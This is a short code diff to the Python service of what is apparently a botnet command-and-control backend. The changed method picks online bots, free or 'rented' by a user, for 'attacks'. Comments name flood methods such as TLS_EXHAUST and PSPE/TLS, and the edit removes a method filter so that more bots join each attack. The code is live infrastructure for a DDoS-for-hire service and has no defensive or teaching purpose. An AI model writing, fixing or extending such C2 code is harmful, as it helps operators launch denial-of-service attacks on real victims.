@@ -80,15 +80,22 @@ class BotService:
 
     @staticmethod
     async def get_available_bots(count: int, methods: List[str], user_id: Optional[UUID] = None) -> List[Bot]:
-        """Pool for attacks: online bots free OR rented by this user, matching at least one method."""
+        """Pool for attacks: online bots free OR rented by this user.
+
+        Do NOT hard-filter by enabled_methods: many bots still have legacy
+        arrays (MEGA/TLS_EXHAUST) while C2 uses PSPE/TLS. Method validation
+        is the bot binary's job; empty/null enabled_methods = accept all.
+        """
         async with async_session() as s:
             base_cond = [Bot.status == "online"]
             if user_id:
                 base_cond.append(or_(Bot.is_rented == False, Bot.rented_by_user_id == user_id))
             else:
                 base_cond.append(Bot.is_rented == False)
-            if methods:
-                base_cond.append(Bot.enabled_methods.overlap([m.upper() for m in methods]))
+            # Soft method filter: only if bot has a non-empty list AND it
+            # doesn't overlap — still include bots with NULL/empty methods.
+            # Skip enabled_methods filter entirely — legacy bot rows break PSPE/TLS.
+            # Online + free/rented-by-user is enough; bot binary validates method.
             q = select(Bot).where(and_(*base_cond)).limit(count)
             result = await s.execute(q)
             return list(result.scalars().all())
